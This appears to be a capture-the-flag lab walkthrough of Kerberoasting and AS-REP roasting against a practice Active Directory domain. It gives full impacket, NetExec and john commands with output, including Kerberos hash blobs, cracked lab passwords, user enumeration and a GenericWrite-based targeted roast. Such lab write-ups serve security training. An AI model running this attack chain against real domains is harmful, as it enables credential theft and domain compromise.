# Kerboroasting (HSM)

## Kerberoasting Lab Walkthrough (HackSmarter.hsm)

## Objective

Extract Kerberos service tickets (TGS) for SPN-enabled accounts, crack them offline, validate recovered credentials, and pivot into additional AD attack paths (BloodHound + AS-REP Roasting).

---

## 1) Initial Access (Low-Privilege Domain User)

We have a standard domain user in the `hacksmarter.hsm` domain. This account is used only to request service tickets (no privileged actions required).

### Request SPN Tickets (Kerberoastable TGS)

This queries for user accounts with SPNs and requests TGS tickets that can be cracked offline.

```
impacket-GetUserSPNs 'hacksmarter.hsm'/'Pentest':'HackSmarter123!' -dc-ip 10.1.148.233 -request 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName              Name           MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------------------  -------------  --------  --------------------------  ---------  ----------
HTTP/marketing.hacksmarter.local  eve_marketing            2026-06-12 01:12:28.383754  <never>               

[-] CCache file is not found. Skipping...
$krb5tgs$23$*eve_marketing$HACKSMARTER.HSM$hacksmarter.hsm/eve_marketing*$7251a9eb59c0f23e2f080f34c671da45$deeb894121c79356e6593e949f4cf1508812960db4176f277b078134682e02a1b11349b0fe45d179fefcb6684efbdf15967b162318f3092c296e9470ed6fbc80d1a1e8c3e3e7530d8f8f71d03ad62e4602ec89fbb68b1e615300e659a40da1e0b3f7921cd10d08bd92da555dbeb778e5adb8701af2a1d4c82a8f359b0041df00e1c1f8c87e11be188ada51dd5566ef41d73e2508a083ef6bd0053fba3fa3c76188d73d27b94fe775ae49860dd8d9650d55146b9aa3dcd7aafc4e83b661ef0ad7fd8133068ceff200020bbcd113e0ca596970bd57413450094b4aeaebdb6d837d3fcb6546990bb6ed85c66e97eab91d680ce23b437d19f87065be8e539402e67bcc7b14a80738d8e4449233c7013e043dce71ada9d0afc9b73d1a13f624cf909265e88acbc216f04c04ef5317a73a645c2f4bb82c9a12e8c91e7be1779c9ff0c5c5c3685d8c62c08eb13a3ebbad481274a95793cc1a4c193d376368c63630f244a7b0a490612d626529402b548145dfbd8f7dc1f0cdaef4abc35bd24a755a1a3536c25e1859e4f200be497413fcf2e1e8b3f6deb40214c90c6cf3fe34d243489f17034cb4e168b788475c710d5c2d73f16c6c760629ed1caafce58cc52e0b9502c2e3728840236e9e4e8fe5f0ca24ba396b7a8d3b9217d289764072541781572a77969d077ac1f43233c897971e6e81ccb5edea3784c1f5fe8e5c598a28e9b0ea9b96db177ff55da988014f6907c917176f8c63e174bc5aca81e332a5a7276a1e743cfeb712a0875d3853c6778ddb628f1999632526ffd263c184d0cda5940e39aa1ac2f90726f49b9a3d5c3c29422a7a362ff59095007bfa8d29090b396f5c2582247992f9efbdedcb1464b42655917c84147eaebe329e944d0383b461474375b25007c6d66b761498b0d4e231f493afddd017ef3d6174599ef6e62d1f371509e5d2f14e66c4b028e8e81f603a8da882ad2f705289f70d16a9a5c1e7851265eb3bc9c767399689a308273ec792ebae159beeab49d7c7daef3e806f7a1976050ecbaca9889d0e28406ad82788f62ab9ac9234fc31b1becc62d23a2db35a2b6416ccb87faf60e0af497f466be14b350a0145e1aa703af99c807679e97123850b445eae0d41a156696efba4649b71c70a9f4a2e14d97165dca4369b20969148e2fd2ac53b78e2b069bd4bd3eb9d1f2bd1eb87eafcef8e1ad894beaa9b5c1ce9c47f5a362d4c0459ea1ec3e782e7209e749cedcc839d66f66d88c252d657f16419f224c2269ae437e4767b22cb07eb1bdc5419c6b22b0ce4515db8a62af5df6be30bbf9b38df34e9e776a91fe304385e3bab6c8036ff0bd2e20c7c873fefc24b579b5de903b7f6f85dc3d448f4dcbcc8a0f9f374406553bdfcb21e857b6336bbaaa69729f37d4fc100e2897dcf8682bb004545e4e63fe69fef2344b864a85e3026a21d8f5bc5c254560e67c4efd615a1e681e8d049b261504c
```

This output contains a `$krb5tgs$23$...` hash (RC4-HMAC). Save it to a file (e.g., `hash.txt`) for offline cracking.

---

## 2) Crack the Kerberoast Hash (Offline)

Use `john` with a wordlist to recover the cleartext password for the SPN account.

```jsx
john --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 7 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           (?)     
1g 0:00:00:00 DONE (2026-06-22 19:28) 25.00g/s 44800p/s 44800c/s 44800C/s 123456..divina
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Recovered password:

- `eve_marketing : 123456`

---

## 3) Validate Credentials (SMB Auth Check)

Always confirm the password works against the domain before moving to the next step.

```jsx
 nxc smb 10.1.148.233 -u eve_marketing -p 123456           
SMB         10.1.148.233    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.148.233    445    DC01             [+] hacksmarter.hsm\eve_marketing:123456 
```

A successful `+` indicates valid domain credentials and confirms the cracked hash is correct.

---

## 4) Enumerate Domain Users (LDAP)

With valid creds, LDAP enumeration becomes much more reliable and can be used for further targeting.

```jsx
nxc ldap 10.1.148.233 -u eve_marketing -p 123456 --users
LDAP        10.1.148.233    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hacksmarter.hsm) (signing:None) (channel binding:No TLS cert) 
LDAP        10.1.148.233    389    DC01             [+] hacksmarter.hsm\eve_marketing:123456 
LDAP        10.1.148.233    389    DC01             [*] Enumerated 16 domain users: hacksmarter.hsm
LDAP        10.1.148.233    389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.1.148.233    389    DC01             Administrator                 2026-06-08 22:27:07 0        Built-in account for administering the computer/domain      
LDAP        10.1.148.233    389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.1.148.233    389    DC01             krbtgt                        2026-06-09 01:05:28 0        Key Distribution Center Service Account                     
LDAP        10.1.148.233    389    DC01             alice_hr                      2026-06-09 01:07:14 0                                                                    
LDAP        10.1.148.233    389    DC01             bob_finance                   2026-06-09 01:07:14 0                                                                    
LDAP        10.1.148.233    389    DC01             charlie_it                    2026-06-09 01:07:14 0                                                                    
LDAP        10.1.148.233    389    DC01             diana_sales                   2026-06-09 01:07:14 0                                                                    
LDAP        10.1.148.233    389    DC01             eve_marketing                 2026-06-12 01:12:28 0                                                                    
LDAP        10.1.148.233    389    DC01             frank_ops                     2026-06-09 01:07:15 0                                                                    
LDAP        10.1.148.233    389    DC01             grace_legal                   2026-06-09 01:07:15 0                                                                                                                                               
LDAP        10.1.148.233    389    DC01             harry_dev                     2026-06-09 01:07:15 0                                                                                                                                               
LDAP        10.1.148.233    389    DC01             irene_support                 2026-06-09 01:07:15 0                                                                                                                                               
LDAP        10.1.148.233    389    DC01             jack_exec                     2026-06-12 01:12:28 0                                                                                                                                               
LDAP        10.1.148.233    389    DC01             tyler_adm                     2026-06-09 01:07:15 0                                                                                                                                               
LDAP        10.1.148.233    389    DC01             pentest                       2026-06-09 01:07:15 0                                                                                                                                               
LDAP        10.1.148.233    389    DC01             backup_svc                    2026-06-12 01:12:28 0      
```

This list is useful for:

- building target lists (e.g., `usernames.txt`)
- hunting service accounts (`*_svc`, `backup_*`, etc.)
- feeding BloodHound collection for graph-based attack paths

---

## 5) BloodHound Collection (AD Graph Recon)

Collect domain data for relationship/ACL analysis (useful for spotting ACL abuse such as GenericWrite, ForceChangePassword, etc.).

```jsx
nxc ldap 10.1.148.233 -u 'Pentest' -p 'HackSmarter123!' --bloodhound --collection All --dns-server 10.1.148.233
LDAP        10.1.148.233    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hacksmarter.hsm) (signing:None) (channel binding:No TLS cert) 
LDAP        10.1.148.233    389    DC01             [+] hacksmarter.hsm\Pentest:HackSmarter123! 
LDAP        10.1.148.233    389    DC01             Resolved collection methods: acl, adcs, container, dcom, group, localadmin, loggedon, objectprops, psremote, rdp, session, trusts
LDAP        10.1.148.233    389    DC01             Excluded collection methods: 
LDAP        10.1.148.233    389    DC01             Bloodhound data collection completed in 0M 36S
LDAP        10.1.148.233    389    DC01             Collecting ADCS data (CertiHound)...
LDAP        10.1.148.233    389    DC01             Found 0 certificate templates
LDAP        10.1.148.233    389    DC01             Found 0 Enterprise CAs
LDAP        10.1.148.233    389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.1.148.233_2026-06-22_193718_bloodhound.zip
```

Once imported into BloodHound, focus on:

- shortest paths to high-value groups (Domain Admins)
- ACL edges like `GenericWrite`, `WriteOwner`, `AddMember`, `ForceChangePassword`
- privilege escalation chains that don't require password cracking

---

## 6) ACL Finding: GenericWrite on `jack_exec`

BloodHound indicates we have **GenericWrite** rights over `jack_exec`.
GenericWrite can enable multiple abuses depending on object type (e.g., setting SPNs, adding shadow credentials, changing attributes). Here we use it to set up / target Kerberoasting against `jack_exec`.

---

## 7) Targeted Kerberoast: Request TGS for `jack_exec`

Request a service ticket for the specific user. If an SPN exists (or is created via abuse), the TGS returned can be cracked offline.

```jsx
impacket-GetUserSPNs hacksmarter.hsm/Pentest:'HackSmarter123!'-dc-ip 10.1.148.233 -request-user jack_exec
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name       MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  ---------  --------  --------------------------  ---------  ----------
cifs/jack_exec        jack_exec            2026-06-12 01:12:28.533870  <never>               

[-] CCache file is not found. Skipping...
$krb5tgs$23$*jack_exec$HACKSMARTER.HSM$hacksmarter.hsm/jack_exec*$777a22d1f9c66bb709d605bf4b274acc$a7a790a3b3b0240063f8f59f9c1420c956cac4be16fba4213103d04e915a72e7419a4f9f42f9f4d3638b62eecc216204ec051a72b0755307f5e7f275fef6d7879c59a0d4c46cfea6565fe7cbbc5156e060a4ba75c400b12817a738e513324e49756367bdb4967f57a9cc1cbae78f489a4ab2de262e47faed950fba3fe38f3d6934e02b10ebf3463403f1c1aea17df37b1238bc6440e232613da4e20e13658798b785292be9528410b236ce33bcc8c2316333cf01f1c3617010a10b22f7e9c77574ea886760c0e2ae157292ee7a26fbfa223441016c66eccbbd7c1563a49e2ed07d0fd525a011ef4457eb519876a599c8239e7f9cfe7f52cef8bc7d566e9acd82ddcb544cd43275936168e298a0ca42a06c74438c38f2c681d583b476b5f3c0f2d73b2a4629f3353f042db4256962b6d97a36b9a2d77b3a3ce17c039781664b15fea9a202fabe4f43518a4b595cbf71e9ac49fd88d170cfe92c99a02f5021f9a30478322042d12bc18de230493ee84f829382d7a79379ab0edaa3e9bc8248075da7a366c4a05e89bac6bc69779d407ec9414d7bd949f46620801e4f5760e145678619501a2683fdb540eb7e52104ea068add66e12ed0c495db2049c4d7839064474d864cd8c4d16b41f1e2edfbc978603015e5b0f9926867833a787fa8620472ae67ab6dd01fadb9aba4d575a1bb307d2d90307c20222a5468a1f58aae6d122b794f91408a5a8fe5282b661df6c5665a7c25eb36f4baec43c7babcbe54479d96f78f28ef412a008ca7607597f11bf264205d427d8d8127b93a925dccab7a0e3776594ee7d7f1f3b5902f70020d6fab2e673b39d1ec9c5c48afe403ed200435eb85b38b3e7459d70934202675161ce40819b479def2378adee3004353a854e0a4a0a35ac090e2847fb8ebf8a46e2c6849e7fb41ad57d8b0483ee6c3f402145e1f6471c71bb75b25ef81168d0f1dcb33146bc6ed1fc0ce937e4bbe9a6df643f6afce62b84df1e8d802b71d6840ef2eec8a70d3c24c1d272ee2cbe4c1b6571be195fbfe023ec97a09ca9e6eb18118d4ff888430396657d7c1ac8381213df9dc5864a1f59124d931b67e77d99548def5d51b8e41a2ef9c1457e93edddb1aaaa525920bb09dfd1c02294aabb157a5c8b224468b8652fa746a8a9b62a8c4f2e155ea67e3b9003185df82e685b506b945b2a528d14a20118f0553761bdd7aace1531a7336791abb49c95b40ed0086bddbb31dd893e99228f05f12ba515532a781dfc32148e959c411040bc1170530696b2a8a26d43f8139b04911d8dcdbbed53dc097be634b3439fa0269069e08c7f13bbb99d12a8a58ed8ea2fce89012b409007aadad7a53783e523a1069702b674e88c31c2d16c139d79a76f7d9fef5261aeb97f31e6d0e880137898401583938e57f5b3470c1638db2718bf6876bb4137e49882dd662971c345a70425a0266007690c5ccd63a9152948dcf6ad
```

Save the `$krb5tgs$23$...` blob as `hash1.txt` and proceed to cracking.

---

## 8) Crack `jack_exec` TGS (Offline)

```jsx
john --wordlist=/usr/share/wordlists/rockyou.txt  hash1.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 7 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (?)     
1g 0:00:00:00 DONE (2026-06-22 19:53) 25.00g/s 44800p/s 44800c/s 44800C/s 123456..divina
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Recovered password:

- `jack_exec : password`

---

## 9) Username Harvesting (SMB Null Session Export)

This can be used to build a clean username list for later spraying / roasting checks (when allowed in lab scope).

```jsx
nxc smb 10.1.148.233 -u '' -p '' --users-export usernames.txt
SMB         10.1.148.233    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.148.233    445    DC01             [+] hacksmarter.hsm\: 
SMB         10.1.148.233    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.1.148.233    445    DC01             Administrator                 2026-06-08 16:57:07 0       Built-in account for administering the computer/domain 
SMB         10.1.148.233    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.1.148.233    445    DC01             krbtgt                        2026-06-08 19:35:28 0       Key Distribution Center Service Account 
SMB         10.1.148.233    445    DC01             alice_hr                      2026-06-08 19:37:14 0        
SMB         10.1.148.233    445    DC01             bob_finance                   2026-06-08 19:37:14 0        
SMB         10.1.148.233    445    DC01             charlie_it                    2026-06-08 19:37:14 0        
SMB         10.1.148.233    445    DC01             diana_sales                   2026-06-08 19:37:14 0        
SMB         10.1.148.233    445    DC01             eve_marketing                 2026-06-11 19:42:28 0        
SMB         10.1.148.233    445    DC01             frank_ops                     2026-06-08 19:37:15 0        
SMB         10.1.148.233    445    DC01             grace_legal                   2026-06-08 19:37:15 0        
SMB         10.1.148.233    445    DC01             harry_dev                     2026-06-08 19:37:15 0        
SMB         10.1.148.233    445    DC01             irene_support                 2026-06-08 19:37:15 0        
SMB         10.1.148.233    445    DC01             jack_exec                     2026-06-11 19:42:28 0        
SMB         10.1.148.233    445    DC01             tyler_adm                     2026-06-08 19:37:15 0        
SMB         10.1.148.233    445    DC01             pentest                       2026-06-08 19:37:15 0        
SMB         10.1.148.233    445    DC01             backup_svc                    2026-06-11 19:42:28 0        
SMB         10.1.148.233    445    DC01             [*] Enumerated 16 local users: HACKSMARTER
SMB         10.1.148.233    445    DC01             [*] Writing 16 local users to usernames.txt
```

This produces a reusable `usernames.txt` for checks like AS-REP roasting (no-preauth).

---

## 10) User List

```jsx
Administrator
Guest
krbtgt
alice_hr
bob_finance
charlie_it
diana_sales
eve_marketing
frank_ops
grace_legal
harry_dev
irene_support
jack_exec
tyler_adm
pentest
backup_svc
```

Keep this list updated as you discover new accounts via LDAP/BloodHound.

---

## 11) AS-REP Roasting (No Pre-Auth Accounts)

If an account has **“Do not require Kerberos preauthentication”** enabled, you can request an AS-REP blob and crack it offline.

```jsx
nxc ldap 10.1.148.233 -u usernames.txt -p '' --asreproast output.txt
LDAP        10.1.148.233    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (signing:None) (channel binding:No TLS cert) 
LDAP        10.1.148.233    389    DC01             [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        10.1.148.233    389    DC01             $krb5asrep$23$backup_svc@HACKSMARTER.HSM:a8c614853a5f069baf6ee8dd8efeebdc$197e912b89da6b30154206c72c9e4198c4db06c8160677f36b5c5e8e74999869afa4c26439140310186cd8aa4f6cabbc36c9a9c898ccbf91380fefcb9c9f8ff2bdd811fd8d7283005b42499cab87c426bd013186f167fd55461a42392b3c91f386e8f3dd7efb606ebf54cde4ec24b3edd454b49f847b4a955973add2c20244aa4b55d86030d1009285924da774839d542de649267bc991cf6890e80ba055879b581eb76176a59a3503e31d7ac36f72a6f13c24414ce6aedd73d8a8e4bfb2cfbf2d22158e23ed3078613d58fdfb2c54118c52d49e88ad732a3e9542824ed7493e486b889f5d1f4d8cf832fea6ad8e9ea4a886
```

The `$krb5asrep$...` hash indicates `backup_svc` is AS-REP roastable.

---

## 12) Crack the AS-REP Hash (Offline)

```jsx
john --wordlist=/usr/share/wordlists/rockyou.txt output.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 7 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qwerty           ($krb5asrep$23$backup_svc@HACKSMARTER.HSM)     
1g 0:00:00:00 DONE (2026-06-23 11:52) 33.33g/s 59733p/s 59733c/s 59733C/s 123456..divina
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Recovered password:

- `backup_svc : qwerty`

---

## 13) Kerberoasting via No-Preauth Targeting (NetExec)

With a confirmed AS-REP roastable account, you can combine enumeration and kerberoasting workflows to request additional TGS hashes (where applicable).

```jsx
nxc ldap 10.1.148.233 -u backup_svc -p '' --no-preauth-targets usernames.txt --kerberoasting kerberoast_hashes.txt
LDAP        10.1.148.233    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (signing:None) (channel binding:No TLS cert) 
LDAP        10.1.148.233    389    DC01             [+] hacksmarter.hsm\backup_svc account vulnerable to asreproast attack 
LDAP        10.1.148.233    389    DC01             [*] Skipping account: krbtgt
LDAP        10.1.148.233    389    DC01             [*] Total of records returned 2
LDAP        10.1.148.233    389    DC01             $krb5tgs$23$*eve_marketing$HACKSMARTER.HSM$eve_marketing*$281f15fcf4bff0edef359deeb343bfc8$48ca21825e9cab22d342895aacd600cc7d7fbe316f247eeb596cbd855eed9b1e0a8d7b883174063aa51c5f9d192d59742ff19b1eedfb7c73ddf1e023fa61ab874f9aa37bfab0467a8a2e95a3512afe453d7a5dc08b7854e81620610f8b74e23770ebe1fb24fc17d66d9e03cbae8e19df537513b029a6775f8954a1450fc68f541b361f1bd41204b2e0f3e67614631a08abd7750e82a3a8f7a0240c68ac98abeeba590476b5c84aa4d0d9a388604e2e4af92f1278d3378f72b1b255c9ce64d7082cc57dfe3927421ab8d2fc27e12782ae5fecc50e2ca65ea3a17eeff503f1a19f7bcd95aec201cefc5169649b18c0a8ba554cd2ca59aab2f8a89d051d00702e4ba14eb2f405b911733a5c62be8979babf34129bd330189e29549d448f8da9455443ceb53716b981f28dbfe3ce75adad9738453fdae49661e7c2ad621ba09bd8c44f1e10a1ad96a440dbf706797af0e04375be85b7acc65bf2a7ea4315c3edee099aec9c3b5badbf42aca74838b66ffcf3d0b4ba49778d5b2dce3e8c4357d24fba8e334e677987387c9516e27f91e3de9d82262f22c3376a16deeb845e9741b0da423db250318b49799a786a564896ec1d47d830af7866f1a63df378ba0c7c4fcf9f19580c0154610085b56242378e5bb8a8c8df35cabdbbb7281cd2c873c6647f5b7b9b1ab798e660e36862a51000c2d35089ba05b2f9e4083d1754d8133a4d02cda525628eb6a59a3b656575fa047cef4ed8812a116bbcb027c6fb804e1106d81a4612e62b7ced805cd3663af7f7776f5f64eca99b61056aea2786df363be2f946090b62cc44544cf3699fac6644e753b88159556f3c15f684009f3c219183162eff4cf4e80a63abc58709472f1c4b9c3daaa73ffcab2437c6520d8950ecaf36b8ae0b5b8615f26cf1fb0647d2358224b2125f087ca567939e6345de25b7180ea3dfca99d39d6dddb114b5fa6ab3954905bd356d891339586eda2dc5ac6330148eb9b2ab8b3d97f0f61d091da05d4623acf7a05a1f7a8beba88157c5936c5282f96ffc82fcbc223c6f49b5e1792042f5e488ccccd914b4cddd8aefcdc8e2c15c91c658a8611437982020a97416f0897b74320c81bb053f7672c076b48bee9995425de8e7ea09391324ee55176de560ddb957b29160eb0613f9c24db80fce381accd7c740698202de28105824bc9738a7ed17da38e6fe90ea62aa394b61d27f94d27a7fdc0735a3a92f5ebb6a7da140a1538f0448252d3d76a59104ce175b94ebe296ed7ef79f5394144fb7c6893c2b6f5a6c6364976ca703472fc9360a086b6c2a4f4c2661fbe6a51e062d88919a8f611f74baf6ff28d63068f985a09dd6bf40542a9dfbe2c7288f1cf8055cbc5dd3085779526ce4eec37be7b27a4689a4825d17be3d3ab77ac29bc8bf4f710e0f1d535428b5557b0ea1a31b4c59ccfeffe098cc02                                                                                
LDAP        10.1.148.233    389    DC01             $krb5tgs$23$*jack_exec$HACKSMARTER.HSM$jack_exec*$5b202832b5d94ada54a568b42290c8c2$388a67c8d22f2dda50cb9b4ca104626822871c346cee5b816e1a774ab8e6ea26a5d1c64f845b1684abf9fbdc914a05f1dc5d96e6377cccc81656ded2b2e1eaaa9d574d9d3b3ae2191e4b837f863c8da19b1c9c746f7547c7f35da525d8212fc953055b953226519b68c7806b5b1394a607b8bf9745c8fb2ce2029d4056cd2b14badabf8695b204d028183ec5454aad001e1cb9e385eca622324231832bbb38d2062c7618cfb7ddf2281d21244bbbb237878c753739ac7cc3bcfd461f48e6b8fcf6cb45731864f8ed41c6b967c70c1e61011513e3867379e1f3f6eab2c2807ae0bc859148b55788515e9dbc6fa7d760bfa496c09072bc06ae40d7ef97344120930e627b5cdba51566d8b87737e66323d4be0cf5d9ecd8d413dccdca1afc238b292769df5b36dfdb0dfa0b9760e7598e508e394da3ece47da772681685426526833fd488f800a0d0e3883fdcd5a0671d1e81118c6b18450663d9a6418e145cb24b78620c4fc40d0c3a2b6b6830c8d8c0631341b43f4403bea81ee2ac8b4e83bc3941ae5ca55f92014497edb9f5e14a8081999fdd2c8e50820b49b83ec6f9e7939304a4610d0706ef45d0c7111c024de0c6de5063547e5fec9632e3288f7ae7f62f9b303ff35ac80b37881a229719af47a054c0684b6bda512c66dfbebc03d3920a5ef1c8744de2c6555e145ab0d61f1852e48beac8b7613197c7549d2b69a60d91930073e42abda329d45d2c92fff3ad74bae477036b7b5dee69097360ec1aca82d97e1f7460ceb6cb808e405055f0390f88889fb42ac72f6314f1e9633316fce08bf019e6e8eb4ad95d747bea6cd025bb00ab1a8aa1be5114d0ebcf0cf9560885723a4165364865efda3883012e5dcc5b8051f082a3c2bd12817fb6f522f0bd9310589c9e93a867b8374c7f7b5ed2cc9a9ac565f12701ae6a0600ad5b6c7af98684ef3d936f0a103cda6b08bafb4c8efda1d2613c20a4997d6acdb0557f1e9eeeb1b37d623df534a32fd4e5c128df5240866df781081ee25afa165c3c09bd947b6f59282ec579c08137a35bd76b8f00223d7bcd90a0ff391055f574bf6e5aa96aeddf6eb4909a51fb9dc8d8db5ec1ac4c3105594ddcd932c2addbdb5c8519eb7b721010b79b4e72fff431e536898bc0442d98fd127db517dbd12f8c501a097985bb71d4bf1627f07990d5ba4d86de8dcc356b622d59fc812a472a44e0153ae83d40cc8a792e5838c18a1756b4bbc4223c6e581ecc6a252052dd93cc9cd446eac514c85ed29ee5952b7acbde2d145b36d615c1fee7e2fecee3b4a077570282af3fcf645b2932a5e86c08cdd3999478f442327d6be372b94088913932521f79cf9331db1e1f97efc0dc4737a3655db68a56a3262885baedbeb6d87be21d5c3a4121da5c9bbebd97892db539688b085c2303a49c28601886bbfe433dc8b04977e29793a1
```

This produces two Kerberoast hashes (`eve_marketing`, `jack_exec`). Since we already cracked both earlier, this step is mainly used as an automated workflow confirmation and for dumping any additional SPN targets that appear in the environment.

---

## Results Summary

- Kerberoast:
    - `eve_marketing : 123456`
    - `jack_exec : password`
- AS-REP roast:
    - `backup_svc : qwerty`
